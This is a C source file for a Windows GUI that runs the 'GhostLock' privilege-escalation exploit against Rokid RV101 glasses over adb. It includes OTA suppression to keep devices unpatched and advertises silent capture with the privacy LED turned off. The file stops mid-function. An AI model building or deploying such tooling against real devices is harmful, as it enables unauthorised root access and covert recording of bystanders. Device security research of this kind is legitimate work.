/*
 * zero_light_desktop.c — Windows 原生 (Win32) LPE 輔助工具 GUI  v2.0
 *
 * Rokid 眼鏡（RV101）GhostLock（CVE-2026-43499）提權輔助工具。
 *
 * v2.0 相對 v1.0 的改進
 *   ── 多國語系（14 語系，比照手機 App）──
 *     · 語系：zh-TW / zh-CN / en / ja / ko / fr / de / es / pt / ru / uk / th / vi / ar
 *     · 可「跟隨系統」自動偵測，或於 UI 下拉選單指定，記憶於 settings.ini
 *     · 阿拉伯文自動 RTL 鏡像（WS_EX_LAYOUTRTL）
 *     · 依語系自動選擇字型（CJK / 泰文 / 阿拉伯文各有後備鏈）
 *     · 字串表由 tools/gen_i18n.py 產生，格式符一致性經靜態驗證
 *
 *   ── 對齊最新研究（rokid_root）──
 *     · 韌體閘門：自動辨識 1.22.009（漏洞版）與 1.25.012+（已修補），已修補即拒跑
 *     · OTA 鎖定：pm suspend com.rokid.glass.ota，避免不可逆升級（跨重開機有效）
 *     · OTA 修補檢查：直接查 Rokid OTA API（MD5 簽名），比對修補門檻
 *     · Shizuku 引擎：每 boot 啟動 libshizuku.so（含 manager 安裝與預授權）
 *     · 靜音拍攝 / 隱私指示燈抑制（root，bind mount 與 lights_ctrl Binder）
 *     · 重開機偵測改用 uptime 回退判定，並等待 boot_completed + uptime > 150s
 *     · 開機健康閘門（執行緒數），避免在系統忙碌時觸發 exploit
 *     · pkill 使用字元類別（ghostlock_rv10[1]）避免自我匹配
 *     · last.cmd 以 tmp+rename 原子寫入，避免 helper 讀到半截 payload
 *     · 依官方 get_root_now.sh：6 次開機 × 每次 2 回觸發，單輪 950 秒
 *
 *   ── 工程品質 ──
 *     · 修正 v1.0 run_process 的管線死結（改為獨立讀取執行緒）
 *     · 可取消長時間操作（一鍵流程中途可停）
 *     · 紀錄可儲存 / 複製 / 清除；狀態列 + 進度條
 *     · Per-Monitor V2 高 DPI、v6 通用控制項（見 src/app.manifest）
 *     · 所有 adb 呼叫皆帶 -s <serial>，多裝置環境安全
 *
 * 依賴：Windows 上的 adb.exe（可由 UI 指定，存 settings.ini）。
 * 僅限自有 / 授權裝置之安全研究使用。
 *
 * 編譯：見 build_mingw.bat / build_msvc.bat / build_mingw.sh
 */

#define WIN32_LEAN_AND_MEAN
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0601
#endif
#include <windows.h>
#include <commctrl.h>
#include <shellapi.h>
#include <shlobj.h>
#include <commdlg.h>
#include <winhttp.h>
#include <bcrypt.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <wchar.h>
#include <richedit.h>
#include <windowsx.h>

#include "i18n.h"
#include "theme.h"
#include "ui.h"

/* ================= 版本與常數 ================= */

#define ZL_VERSION      L"3.0.0"
#define ZL_VERSION_A    "3.0.0"

#define WIN_W           1180
#define WIN_H           726
#define MIN_W           940
#define MIN_H           600
#define MARGIN          16
#define GAP             12
#define HDR_H           48
#define STATUSH         34
#define PAD             18

/* 控制項 ID */
#define ID_APPLY        1001
#define ID_REFRESH      1002
#define ID_BROWSE_ADB   1003
#define ID_PUSH         1004
#define ID_HELPER       1005
#define ID_TRIGGER      1006
#define ID_ONECLICK     1007
#define ID_VERIFY       1008
#define ID_GLLOG        1009
#define ID_REBOOT       1010
#define ID_CUSTOM       1011
#define ID_CANCEL       1012
#define ID_OTALOCK      1013
#define ID_OTAUNLOCK    1014
#define ID_OTACHECK     1015
#define ID_SHIZUKU      1016
#define ID_SILENT_ON    1017
#define ID_SILENT_OFF   1018
#define ID_LED_OFF      1019
#define ID_LED_ON       1020
#define ID_SAVELOG      1021
#define ID_COPYLOG      1022
#define ID_CLEARLOG     1023
#define ID_ABOUT        1024
#define ID_LANG         1025

/* 自訂訊息 */
#define WM_LOG    (WM_APP + 1)   /* LPARAM = wchar_t*（需 free） */
#define WM_STAT   (WM_APP + 2)   /* LPARAM = wchar_t*（需 free） */
#define WM_INFO   (WM_APP + 3)   /* LPARAM = wchar_t*（需 free） */
#define WM_BUSY   (WM_APP + 4)   /* WPARAM = 0/1 */
#define WM_SERIAL (WM_APP + 5)   /* LPARAM = wchar_t*（需 free） */
#define WM_PROG   (WM_APP + 6)   /* WPARAM = 0..100，-1 = 隱藏 */
#define WM_APPLYLANG (WM_APP + 7) /* WPARAM = 語系索引（-1 = 跟隨系統） */

/* 操作代碼 */
#define OP_REFRESH   1
#define OP_PUSH      2
#define OP_HELPER    3
#define OP_TRIGGER   4
#define OP_ONECLICK  5
#define OP_VERIFY    6
#define OP_GLLOG     7
#define OP_REBOOT    8
#define OP_CUSTOM    9
#define OP_OTALOCK   10
#define OP_OTAUNLOCK 11
#define OP_OTACHECK  12
#define OP_SHIZUKU   13
#define OP_SILENT_ON 14
#define OP_SILENT_OFF 15
#define OP_LED_OFF   16
#define OP_LED_ON    17
#define OP_POLL      18

/* 裝置端路徑（與 rokid_root 的 deploy 目錄下 .sh 腳本保持一致） */
#define DEV_TMP         "/data/local/tmp/"
#define DEV_EXPLOIT     "/data/local/tmp/ghostlock_rv101"
#define DEV_DAEMON      "/data/local/tmp/root_daemon"
#define DEV_SOCK        "/data/local/tmp/root_daemon.sock"
/*
 * 桌面工具有自己的 helper 與信箱目錄（尾碼 _desktop）。
 *
 * 為什麼要分開：App 端（com.rokid.rc.glasses）的 root_bridge.sh 會
 * `pkill -f ghostlock_bridge_helper.sh`，而桌面工具會 `pkill ghostlock_rv101`；
 * 兩邊共用同一支 helper 與同一個信箱時，任一邊啟動都會踩掉另一邊正在跑的操作。
 * 分開之後各自 pkill 自己的，互不影響。
 *
 * 但 exploit 本體（ghostlock_rv101、.ghostlock_root.sh、gl_run.log）無法分開，
 * 所以那一段仍靠 DEV_LEASE 租約序列化。
 */
#define DEV_BRIDGE      "/data/local/tmp/ghostlock_bridge_desktop"
#define DEV_HELPER      "/data/local/tmp/ghostlock_bridge_helper_desktop.sh"
/*
 * 共用租約：**三處必須完全一致**（本檔、RootDaemonKeeper.kt、deploy/lease.sh）。
 *
 * 為什麼在 ghostlock_bridge/ 子目錄而不是 /data/local/tmp 本身：
 *   /data/local/tmp 是 drwxrwx--x shell shell，眼鏡 App（uid 10053）屬 "other"，
 *   只有 --x 沒有目錄寫入權 → 實測**既不能建立也不能刪除**其中的檔案。
 *   那讓 App 側的租約長期失效：租約檔不存在時 takeLease() 必然失敗
 *   （App 沒持租約就跑 exploit）、dropLease() 永遠無效（殘留租約卡住別人）。
 *   ghostlock_bridge/（App 的信箱目錄）是 777，App 在其中可以建立／刪除，
 *   所以租約放這裡就從根本移除權限陷阱。
 */
#define DEV_LEASE       "/data/local/tmp/ghostlock_bridge/ghostlock_op.lease"
#define DEV_LEASE_DIR   "/data/local/tmp/ghostlock_bridge"
/* 舊路徑（在 /data/local/tmp 下）：只在遷移時清掉，避免兩份租約並存 */
#define DEV_LEASE_LEGACY "/data/local/tmp/ghostlock_op.lease"
/* 寬字串版本：程式內所有 adb 指令都要用這兩個，不可再硬編碼舊路徑。
   （先前只改了窄字串常數與 helper 腳本內部，其餘十幾處仍寫死舊路徑，
     造成 helper 裝在舊檔名卻往新目錄找、工具寫 last.cmd 到舊目錄 → 全盤失效。） */
#define DEV_BRIDGE_W    L"/data/local/tmp/ghostlock_bridge_desktop"
#define DEV_HELPER_W    L"/data/local/tmp/ghostlock_bridge_helper_desktop.sh"
#define DEV_ROOTSH      "/data/local/tmp/.ghostlock_root.sh"
#define DEV_RUNLOG      "/data/local/tmp/gl_run.log"
#define DEV_SILENT_OGG  "/data/local/tmp/silent_camera.ogg"
#define DEV_SILENT_SH   "/data/local/tmp/zl_silent.sh"
#define DEV_LED_SH      "/data/local/tmp/zl_led.sh"
#define DEV_LED_HOLD    "/data/local/tmp/zl_led_hold"

/*
 * 上述路徑的寬字串版本，僅供 swprintf 的 %ls 使用。
 * 刻意不使用 %hs：MinGW 的 ANSI stdio 與 MSVC 對「寬 printf 中的 %s/%hs」
 * 採不同慣例，%ls 在兩者皆明確代表寬字串，可避免執行期格式不符。
 */
#define DEV_EXPLOIT_W    L"/data/local/tmp/ghostlock_rv101"
#define DEV_DAEMON_W     L"/data/local/tmp/root_daemon"
#define DEV_SILENT_OGG_W L"/data/local/tmp/silent_camera.ogg"

/* 套件 / 服務（一律使用寬字串版本，供 swprintf 的 %ls 直接使用） */
#define PKG_SHIZUKU_W   L"moe.shizuku.privileged.api"
#define PKG_GLASSES_W   L"com.rokid.rc.glasses"
#define PERM_SHIZUKU_W  L"moe.shizuku.manager.permission.API_V23"
#define PKG_OTA_W       L"com.rokid.glass.ota"

/* 一鍵流程參數（對齊 deploy/get_root_now.sh） */
#define MAX_BOOTS          6
#define TRIGGERS_PER_BOOT  2
#define POLL_S             5
#define ROUND_TIMEOUT_S    950
#define WAIT_DEVICE_S      180
#define MIN_UPTIME_S       150
#define MAX_THREADS        2500

/*
 * 開機迴圈保護（2026-09-13）
 *
 * 為什麼桌面板也需要：App 側的 ArmPolicy 只保護「App 自己的自動武裝路徑」，
 * 而桌面板走自己的 _desktop helper **直接**跑 exploit，完全繞過它。
 * 一次一鍵最多 MAX_BOOTS × TRIGGERS_PER_BOOT = 12 次嘗試，
 * 每次約 50% 機率 kernel panic → 重開機（見 docs/research-update.md），
 * 所以一次點擊就可能造成連續 5–6 次重開機（實測的「拔線後一直重開」）。
 *
 * 對策（P0–P2）：
 *   P0-a 斷路器  —— 連續 LOOP_SUSPECT_MAX 次「武裝後 ≤ LOOP_SUSPECT_WINDOW_S 就重開」
 *                   → 中止本次執行。**狀態存 settings.ini，跨啟動有效**，
 *                   否則使用者只要重開工具就繞過了。
 *   P0-b 預檢    —— 一鍵前若窗內重開 ≥ LOOP_RECENT_MAX 次（或斷路器已跳脫）
 *                   → 警告並要求確認。**警告但允許手動覆寫**。
 *   P1   計數    —— 每次嘗試都顯示「第 N/12 次」，讓使用者知道自己在賭幾次。
 *   P2   供電    —— 未充電（沒插線）時警告：panic 重開時無法觀察也無法介入。
 */
#define LOOP_SUSPECT_WINDOW_S   (10 * 60)  /* 武裝後幾秒內重開算「可疑」 */
#define LOOP_SUSPECT_MAX        2          /* 連續幾次可疑 → 跳脫 */
#define LOOP_RECENT_WINDOW_S    (10 * 60)  /* 一鍵前預檢的回看窗 */
#define LOOP_RECENT_MAX         2          /* 窗內幾次重開 → 警告 */
#define LOOP_HIST_MAX           8          /* 保存的開機時間筆數 */
#define LOOP_ATTEMPTS_TOTAL     (MAX_BOOTS * TRIGGERS_PER_BOOT)

/* 韌體門檻 */
#define FW_VULN_MARK       "1.22.009"
#define FW_PATCHED_VER     "1.25.012"
#define FW_PATCHED_VER_W   L"1.25.012"

/* OTA API（逆向自 com.rokid.glass.ota.CheckService，見 deploy/ota_api.py） */
#define OTA_HOST           L"ota.rokid.com"
#define OTA_PATH           L"/v1/extended/ota/check"

/* ================= 全域狀態 ================= */

static HINSTANCE g_hinst;
static HWND g_main, g_log, g_adb_edit, g_serial_edit, g_cmd_edit, g_apk_edit;

/* ---- v3 自繪 UI 狀態（ui_shell.h 會用到，故必須早於其 include） ---- */
static HFONT   g_font_body = NULL, g_font_bold2 = NULL, g_font_small = NULL;
static zl_ui   g_ui;
static int     g_hover = 0, g_press = 0;
static int     g_manual_open = 0, g_log_open = 0, g_set_open = 0, g_lang_open = 0, g_detail_open = 0;
static int     g_log_popup = 0;        /* 紀錄彈跳視窗 */

/* 獨立紀錄視窗狀態（宣告需早於 apply_language） */
/* 篩選：-1 全部，其餘對應 log_level_color() 的等級 */
static int  g_lw_filter = -1;
static HWND g_logwnd = NULL, g_lw_edit = NULL;
static HWND g_lw_btn[8];
static HFONT g_lw_font = NULL;
static wchar_t g_status_text[512] = L"";
static wchar_t g_last_result[256] = L"";
static int     g_last_ok = 1;
static int     g_log_lines = 0;
/* 收合狀態下顯示的最近兩行（避免紀錄卡留白過多） */
static wchar_t g_logtail[2][512];
static int     g_logtail_n = 0;
static double  g_prog_frac = 0.0;
static wchar_t g_prog_text[256] = L"";
static int     g_prog_show = 0;
/* g_theme_mode 由 theme.h 提供（-1 跟隨系統、0 深色、1 淺色） */

/* v3 UI 函式前置宣告（ui_shell.h 於檔尾 include） */
static void ui_calc(void);
static void ui_sync_children(void);
static void ui_paint(HWND hwnd);
static void ui_invoke(int id);
static void ui_apply_theme(int mode);
static void do_poll(void);
static void logwin_open(void);
static void lease_write(void);
static void lease_drop(void);
static int  cleanup_stray_exploits(void);
static void logwin_retitle(void);
static void logwin_apply_theme(void);
static void logwin_populate(void);
#define ID_CLOSE_LOGWIN 3199
static wchar_t g_exe_dir[MAX_PATH];
static wchar_t g_adb[MAX_PATH] = L"adb";
static wchar_t g_serial[128] = L"";
static wchar_t g_apk[MAX_PATH] = L"";
static volatile LONG g_busy = 0;
static volatile LONG g_cancel = 0;
static int  g_dpi = 96;
/* g_log_top 已由 v3 自繪版面取代 */
static int  g_lang_setting = -1;      /* -1 = 跟隨系統，否則為 LANG_* */
static wchar_t *g_pending_cmd = NULL; /* ID_CUSTOM 在 UI 執行緒抓取的指令，交給 worker */
static volatile LONG g_close_when_idle = 0;
static volatile LONG g_polling = 0;      /* 背景輪詢進行中 */
static volatile LONG g_quiet_probe = 0;  /* 1 = 靜默探測，不寫紀錄 */
static int g_reported_state = 99;        /* 上次已回報的裝置狀態 */
static CRITICAL_SECTION g_dev_cs;        /* 保護 g_dev（輪詢執行緒 vs UI 執行緒） */
#define TIMER_POLL 1

/* 裝置資訊（結構化 —— 自繪介面需要個別欄位，不再拼成一團文字） */
typedef struct {
    int     state;          /* 1=ok 0=none -1=unauth -2=offline -3=adb 失敗 */
    wchar_t serial[64];
    wchar_t model[64];
    wchar_t fw[128];
    wchar_t spl[32];
    wchar_t android[32];
    wchar_t selinux[24];
    int     rooted;
    int     shizuku;
    /*
     * Shizuku manager 是否已安裝：1=是 0=否 -1=尚未得知。
     * 由背景輪詢填入，讓「按 Shizuku 開關時要不要跳 APK 選擇框」不必在
     * UI 執行緒上呼叫 adb（那會與 worker 搶 adb，且會卡住畫面）。
     */
    int     shizuku_installed;
    long    uptime;
    int     fw_state;
    int     ota_locked;
    int     silent_on;
    int     led_off;
} zl_dev_t;
/* 起始值：狀態未知，shizuku_installed = -1（尚未輪詢） */
static zl_dev_t g_dev = { .state = 0, .shizuku_installed = -1 };


/* 紀錄緩衝（供重建 UI / 儲存 / 複製用） */
static wchar_t *g_logbuf = NULL;
static size_t   g_loglen = 0, g_logcap = 0;
#define LOG_MAX_CHARS (512 * 1024)

/* 最近一次偵測到的裝置資訊 */
static wchar_t g_fw[128] = L"";
static int     g_fw_state = 0;        /* 0=未知 1=漏洞版 2=已修補 */

/* ================= 前置宣告 ================= */

static void drain_log_messages(void);   /* 定義於 UI 區段，存檔／複製／重建前會用到 */
static void apply_language(int lang_index_or_minus1);
static void do_refresh(void);           /* 定義於裝置操作區段，一鍵流程結束後會呼叫 */

/* ================= 縮放 ================= */

static int S(int v) { return MulDiv(v, g_dpi, 96); }

/*
 * 取得「視窗實際所在螢幕」的 DPI。
 * 開頭的 GetDC(NULL) 只反映主螢幕；在混合縮放比例的環境（例如主螢幕 96 DPI、
 * 這個視窗落在 192 DPI 的螢幕）會拿到錯的值，導致「字型 2x、版面 1x」的錯配。
 * GetDpiForWindow 是 Win10 1607+ 才有，故以 GetProcAddress 動態載入以維持 Win7 相容。
 */
static int dpi_for_window(HWND h) {
    typedef UINT (WINAPI *pfn_getdpiforwindow)(HWND);
    HMODULE u = GetModuleHandleW(L"user32.dll");
    if (u) {
        pfn_getdpiforwindow fn =
            (pfn_getdpiforwindow)(void *)GetProcAddress(u, "GetDpiForWindow");
        if (fn && h) {
            UINT d = fn(h);
            if (d >= 72 && d <= 960) return (int)d;
        }
    }
    HDC dc = GetDC(h);
    if (dc) {
        int d = GetDeviceCaps(dc, LOGPIXELSY);
        ReleaseDC(h, dc);
        if (d >= 72 && d <= 960) return d;
    }
    return 96;
}

/*
 * 把視窗調整到「客戶區剛好是 cw x ch」。
 *
 * 不使用 AdjustWindowRectEx：在 Per-Monitor V2 且視窗落在與執行緒 DPI 內容
 * 不同的螢幕時，它算出的非客戶區大小可能與實際不符（實測 1060x820 的客戶區
 * 被建成 1060x799，狀態列因此被截掉 19 px）。
 * 這裡直接量測活體視窗的非客戶區差值，無論 DPI 與樣式都準確。
 */
static void fit_client(HWND h, int cw, int ch) {
    RECT wr, cr;
    if (!h || !GetWindowRect(h, &wr) || !GetClientRect(h, &cr)) return;
    int ncx = (wr.right - wr.left) - cr.right;
    int ncy = (wr.bottom - wr.top)  - cr.bottom;
    if (ncx < 0) ncx = 0;
    if (ncy < 0) ncy = 0;

    /* 不可超出所在螢幕的工作區：實測 2880x1620 的螢幕上，理想高度 1691 px
       會被系統裁到 1650 px，視窗底部跑到螢幕外。這裡主動收斂，
       再由 ui_layout() 依實際客戶區重排，狀態列才不會被推到畫面外。 */
    MONITORINFO mi;
    memset(&mi, 0, sizeof(mi));
    mi.cbSize = sizeof(mi);
    if (GetMonitorInfoW(MonitorFromWindow(h, MONITOR_DEFAULTTONEAREST), &mi)) {
        int maxw = mi.rcWork.right - mi.rcWork.left;
        int maxh = mi.rcWork.bottom - mi.rcWork.top;
        if (cw + ncx > maxw) cw = maxw - ncx;
        if (ch + ncy > maxh) ch = maxh - ncy;
    }

    SetWindowPos(h, NULL, 0, 0, cw + ncx, ch + ncy,
                 SWP_NOMOVE | SWP_NOZORDER | SWP_NOACTIVATE);
}

/* ================= 小工具 ================= */

static void *xmalloc(size_t n) { return malloc(n ? n : 1); }

static char *xstrdup(const char *s) {
    if (!s) return NULL;
    size_t n = strlen(s) + 1;
    char *p = (char *)xmalloc(n);
    if (p) memcpy(p, s, n);
    return p;
}

static wchar_t *xwcsdup(const wchar_t *s) {
    if (!s) return NULL;
    size_t n = (wcslen(s) + 1) * sizeof(wchar_t);
    wchar_t *p = (wchar_t *)xmalloc(n);
    if (p) memcpy(p, s, n);
    return p;
}

/* 寬字串 → UTF-8（需 free） */
static char *wide_to_utf8(const wchar_t *s) {
    if (!s) return NULL;
    int n = WideCharToMultiByte(CP_UTF8, 0, s, -1, NULL, 0, NULL, NULL);
    if (n <= 0) return NULL;
    char *c = (char *)xmalloc((size_t)n);
    if (!c) return NULL;
    WideCharToMultiByte(CP_UTF8, 0, s, -1, c, n, NULL, NULL);
    return c;
}

/* UTF-8 → 寬字串（需 free） */
static wchar_t *utf8_to_wide(const char *s) {
    if (!s) return NULL;
    int n = MultiByteToWideChar(CP_UTF8, 0, s, -1, NULL, 0);
    if (n <= 0) return NULL;
    wchar_t *w = (wchar_t *)xmalloc((size_t)n * sizeof(wchar_t));
    if (!w) return NULL;
    MultiByteToWideChar(CP_UTF8, 0, s, -1, w, n);
    return w;
}

/* 去掉尾端 CR/LF，並把內部的 CR 換成空白 */
static void trim_crlf(char *s) {
    if (!s) return;
    size_t n = strlen(s);
    while (n > 0 && (s[n - 1] == '\r' || s[n - 1] == '\n')) s[--n] = '\0';
    for (char *p = s; *p; p++) if (*p == '\r') *p = ' ';
}

/*
 * 取 "KEY=value" 形式的 value（需 free）。
 * 刻意不修改來源緩衝區 —— 若就地插入 '\0'，後續查詢會找不到換行而漏掉其他欄位。
 */
static char *kv_get(const char *text, const char *key) {
    if (!text || !key) return NULL;
    size_t kl = strlen(key);
    const char *p = text;
    while (p && *p) {
        const char *nl = strchr(p, '\n');
        size_t linelen = nl ? (size_t)(nl - p) : strlen(p);
        if (linelen > kl && strncmp(p, key, kl) == 0 && p[kl] == '=') {
            const char *v = p + kl + 1;
            size_t vlen = linelen - kl - 1;
            while (vlen > 0 && (v[vlen - 1] == '\r' || v[vlen - 1] == '\n')) vlen--;
            char *out = (char *)xmalloc(vlen + 1);
            if (!out) return NULL;
            memcpy(out, v, vlen);
            out[vlen] = '\0';
            return out;
        }
        if (!nl) break;
        p = nl + 1;
    }
    return NULL;
}

/* kv_get 的空值安全版本：找不到或空字串時回傳預設值（需 free） */
static char *kv_get_def(const char *text, const char *key, const char *def) {
    char *v = kv_get(text, key);
    if (v && *v) return v;
    if (v) free(v);
    return xstrdup(def ? def : "");
}

/* ================= 紀錄輸出 ================= */

static void logbuf_append(const wchar_t *s) {
    if (!s) return;
    size_t n = wcslen(s);
    if (g_loglen + n + 3 > g_logcap) {
        size_t ncap = g_logcap ? g_logcap * 2 : 65536;
        while (ncap < g_loglen + n + 3) ncap *= 2;
        wchar_t *nb = (wchar_t *)realloc(g_logbuf, ncap * sizeof(wchar_t));
        if (!nb) return;
        g_logbuf = nb;
        g_logcap = ncap;
    }
    if (!g_logbuf) return;
    memcpy(g_logbuf + g_loglen, s, n * sizeof(wchar_t));
    g_loglen += n;
    g_logbuf[g_loglen++] = L'\r';
    g_logbuf[g_loglen++] = L'\n';
    g_logbuf[g_loglen] = L'\0';

    /* 超過上限時，從前面裁掉約 1/4，避免無限成長 */
    if (g_loglen > LOG_MAX_CHARS) {
        size_t drop = LOG_MAX_CHARS / 4;
        while (drop < g_loglen && g_logbuf[drop] != L'\n') drop++;
        if (drop < g_loglen) drop++;
        memmove(g_logbuf, g_logbuf + drop, (g_loglen - drop + 1) * sizeof(wchar_t));
        g_loglen -= drop;
    }
}

/* 送一行（已含時間戳）到 UI */
static void log_w(const wchar_t *s) {
    wchar_t line[4096];
    SYSTEMTIME st;
    GetLocalTime(&st);
    if (swprintf(line, 4096, L"[%02d:%02d:%02d] %ls",
                 st.wHour, st.wMinute, st.wSecond, s) < 0) {
        line[4095] = L'\0';
    }
    /*
     * 只負責把整行「交給 UI 執行緒」。g_logbuf 一律由 UI 執行緒維護：
     * 若 worker 執行緒直接 realloc 它，UI 端（存檔／複製／重建介面）可能
     * 同時讀取而造成 use-after-free。
     */
    wchar_t *dup = xwcsdup(line);
    if (dup && !PostMessageW(g_main, WM_LOG, 0, (LPARAM)dup)) free(dup);
}

/* 多語系格式化紀錄：log_msg(STR_XXX, args...) */
static void log_msg(int id, ...) {
    wchar_t buf[3072];
    va_list ap;
    va_start(ap, id);
    if (vswprintf(buf, 3072, T(id), ap) < 0) buf[3071] = L'\0';
    va_end(ap);
    log_w(buf);
}

/* 直接把裝置輸出（UTF-8）寫進紀錄，每行加上縮排 */
static void log_u8(const char *utf8) {
    if (!utf8) return;
    wchar_t *w = utf8_to_wide(utf8);
    if (!w) return;
    log_w(w);
    free(w);
}

static void stat_w(const wchar_t *txt) {
    wchar_t *d = xwcsdup(txt);
    if (d && !PostMessageW(g_main, WM_STAT, 0, (LPARAM)d)) free(d);
}
static void stat_msg(int id, ...) {
    wchar_t buf[1024];
    va_list ap;
    va_start(ap, id);
    if (vswprintf(buf, 1024, T(id), ap) < 0) buf[1023] = L'\0';
    va_end(ap);
    stat_w(buf);
}
static void info_w(const wchar_t *txt) {
    wchar_t *d = xwcsdup(txt);
    if (d && !PostMessageW(g_main, WM_INFO, 0, (LPARAM)d)) free(d);
}
static void serial_w(const wchar_t *txt) {
    wchar_t *d = xwcsdup(txt);
    if (d && !PostMessageW(g_main, WM_SERIAL, 0, (LPARAM)d)) free(d);
}
static void prog_set(int pct) {
    PostMessageW(g_main, WM_PROG, (WPARAM)pct, 0);
}


/* ================= 執行子程序 ================= */

/*
 * v2.0 修正：v1.0 先寫完 stdin 才讀 stdout，若子程序在讀 stdin 前就輸出
 * 超過管線緩衝區（64 KB）的資料，雙方會互相等待而死結。
 * 這裡改成「獨立執行緒持續讀 stdout」，主執行緒負責寫 stdin 與等待，
 * 並支援逾時終止與使用者取消。
 */

typedef struct {
    HANDLE rd;
    char  *buf;
    size_t len, cap;
    int    oom;
} rd_ctx;

static DWORD WINAPI rd_thread(LPVOID p) {
    rd_ctx *c = (rd_ctx *)p;
    char tmp[8192];
    DWORD n = 0;
    while (ReadFile(c->rd, tmp, sizeof(tmp), &n, NULL) && n > 0) {
        if (c->len + n + 1 > c->cap) {
            size_t ncap = c->cap ? c->cap * 2 : 65536;
            while (ncap < c->len + n + 1) ncap *= 2;
            char *nb = (char *)realloc(c->buf, ncap);
            if (!nb) { c->oom = 1; break; }
            c->buf = nb;
            c->cap = ncap;
        }
        memcpy(c->buf + c->len, tmp, n);
        c->len += n;
    }
    return 0;
}

/*
 * 執行命令列並收集 stdout+stderr。
 *   cmdline    ：完整命令列（CreateProcessW 直接解讀，不經 cmd.exe）
 *   input      ：寫入子程序 stdin 的內容（可 NULL）
 *   out        ：回傳輸出（需 free；可 NULL）
 *   timeout_ms ：> 0 時逾時即終止子程序
 * 回傳：行程 exit code；-1 表示啟動失敗或被取消
 */
static int run_process(const wchar_t *cmdline, const char *input,
                       char **out, int timeout_ms) {
    HANDLE rd = NULL, wr = NULL, ir = NULL, iw = NULL, hr = NULL;
    HANDLE hNul = NULL;
    SECURITY_ATTRIBUTES sa;
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    DWORD exit_code = (DWORD)-1;
    rd_ctx rc;
    int cancelled = 0;

    memset(&rc, 0, sizeof(rc));
    if (out) *out = NULL;
    if (InterlockedCompareExchange(&g_cancel, 0, 0) != 0) return -1;

    memset(&sa, 0, sizeof(sa));
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;

    if (!CreatePipe(&rd, &wr, &sa, 0)) goto done;
    SetHandleInformation(rd, HANDLE_FLAG_INHERIT, 0);
    if (input) {
        if (!CreatePipe(&ir, &iw, &sa, 0)) goto done;
        SetHandleInformation(iw, HANDLE_FLAG_INHERIT, 0);
    }

    /*
     * 沒有要餵 stdin 時，明確導向 NUL 裝置。
     * 若把 hStdInput 留成 NULL，子程序拿到的是一個無效控制代碼；
     * adb 在多數子指令不會讀 stdin，但導向 NUL 可確保任何讀取都安全地得到 EOF。
     */
    if (!input) {
        SECURITY_ATTRIBUTES sa2;
        memset(&sa2, 0, sizeof(sa2));
        sa2.nLength = sizeof(sa2);
        sa2.bInheritHandle = TRUE;
        hNul = CreateFileW(L"NUL", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                           &sa2, OPEN_EXISTING, 0, NULL);
        if (hNul == INVALID_HANDLE_VALUE) hNul = NULL;
    }

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = wr;
    si.hStdError = wr;
    si.hStdInput = input ? ir : hNul;
    memset(&pi, 0, sizeof(pi));

    wchar_t *cmd = xwcsdup(cmdline);
    if (!cmd) goto done;
    BOOL ok = CreateProcessW(NULL, cmd, NULL, NULL, TRUE,
                             CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    free(cmd);
    if (!ok) goto done;

    CloseHandle(wr); wr = NULL;
    /*
     * 父行程要「寫」stdin 管線，所以現在關掉自己這一份讀端（子行程已有繼承的副本）。
     * ir = 讀端（給子行程）、iw = 寫端（父行程用）。
     *
     * 注意：v1.0 與先前的 v2.0 把這兩個角色弄反了 —— 它保留 iw 卻在寫入前先
     * CloseHandle(iw)，然後對「讀端」ir 做 WriteFile。結果子行程立刻收到 EOF，
     * stdin 一個位元組都送不出去（實測：② 安裝 helper 會寫出空腳本、
     * 自訂 root 指令完全沒作用，但畫面只會顯示「無輸出」而不易察覺）。
     */
    if (ir) { CloseHandle(ir); ir = NULL; }

    /* 先開始讀輸出，避免子程序因管線滿而卡住 */
    rc.rd = rd;
    hr = CreateThread(NULL, 0, rd_thread, &rc, 0, NULL);

    /* 寫入 stdin，寫完關閉寫端以送出 EOF */
    if (input && iw) {
        DWORD total = (DWORD)strlen(input), w = 0;
        while (w < total) {
            DWORD n = 0;
            if (InterlockedCompareExchange(&g_cancel, 0, 0) != 0) { cancelled = 1; break; }
            if (!WriteFile(iw, input + w, total - w, &n, NULL) || n == 0) break;
            w += n;
        }
        CloseHandle(iw); iw = NULL;
    }

    /* 等待結束（可逾時 / 可取消） */
    {
        DWORD start = GetTickCount();
        for (;;) {
            if (WaitForSingleObject(pi.hProcess, 150) == WAIT_OBJECT_0) break;
            if (InterlockedCompareExchange(&g_cancel, 0, 0) != 0) { cancelled = 1; break; }
            if (timeout_ms > 0 && (GetTickCount() - start) > (DWORD)timeout_ms) break;
        }
        if (WaitForSingleObject(pi.hProcess, 0) != WAIT_OBJECT_0) {
            TerminateProcess(pi.hProcess, 1);
            WaitForSingleObject(pi.hProcess, 5000);
        }
    }

    GetExitCodeProcess(pi.hProcess, &exit_code);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    /* 收尾：等讀取執行緒；必要時用 CancelSynchronousIo 解開阻塞的 ReadFile */
    /*
     * 收尾：等讀取執行緒結束。
     *   正常：子程序結束 → 管線 EOF → ReadFile 回 0 → 執行緒立刻結束，
     *         WaitForSingleObject 幾乎不耗時。
     *   異常：若 adb 的背景 server 等「孫程序」继承了管線寫入端，EOF 永遠不會
     *         到來，此時以 CancelSynchronousIo 解開阻塞。
     * 逾時刻意設短（400 ms）：此刻子程序已結束，它所有的輸出不是已被讀走、
     * 就是躺在管線緩衝區裡；執行緒若仍阻塞代表緩衝區已空，取消不會遺失
     * adb 本身的輸出，只會丟掉殘留孫程序的輸出（那也不是我們要的）。
     */
    if (hr) {
        if (WaitForSingleObject(hr, 400) == WAIT_TIMEOUT) {
            CancelSynchronousIo(hr);
            if (WaitForSingleObject(hr, 1500) == WAIT_TIMEOUT) {
                /*
                 * 最後手段：關閉讀取端迫使阻塞的 ReadFile 立刻失敗。
                 * 之後必須「無限等待」——rc 是堆疊變數，若在執行緒仍存活時
                 * 返回，執行緒會透過懸空指標寫入並 realloc 已釋放的緩衝區。
                 * 這裡位於 worker 執行緒，無限等待不會卡住 UI。
                 */
                if (rd) { CloseHandle(rd); rd = NULL; }
                WaitForSingleObject(hr, INFINITE);
            }
        }
